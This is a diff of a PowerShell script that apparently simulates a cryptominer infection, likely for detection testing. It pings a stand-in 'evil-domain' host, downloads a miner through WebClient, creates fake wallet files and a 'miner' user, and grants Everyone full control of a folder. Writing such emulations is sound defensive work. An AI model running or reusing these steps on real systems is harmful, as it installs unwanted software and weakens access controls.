@@ -7,6 +7,7 @@ cmd.exe /c "ping www.evil-domain.com"
 Start-Sleep -s 2
 
 New-Item -Path "c:\" -Name "wallet" -ItemType "directory"
+
 New-Item -Path "c:\wallet" -Name "mfenXtMVwAKeKjzdrHYJFbsHeeqf7SDK3Z.coin" -ItemType "file" -Value "mfenXtMVwAKeKjzdrHYJFbsHeeqf7SDK3Z"
 New-Item -Path "c:\wallet" -Name "mhsdyklbtTjfdeenckjRRHNUUKlerjurhu.coin" -ItemType "file" -Value "mhsdyklbtTjfdeenckjRRHNUUKlerjurhu"
 New-Item -Path "c:\wallet" -Name "myuewtyolwUJULEWOyyiedfjhffenXtMVw.coin" -ItemType "file" -Value "myuewtyolwUJULEWOyyiedfjhffenXtMVw"
@@ -29,10 +30,11 @@ $web = New-Object -TypeName System.Net.WebClient
 $web.DownloadFile($miner,$DEST)
 
 
-$Acl = Get-ACL $DEST
-$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","Allow")
+$fld = "c:\wallet"
+$Acl = Get-ACL $fld
+$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
 $Acl.AddAccessRule($AccessRule)
-Set-Acl $DEST $Acl
+Set-Acl $fld $Acl
 
 
 $username = 'miner'
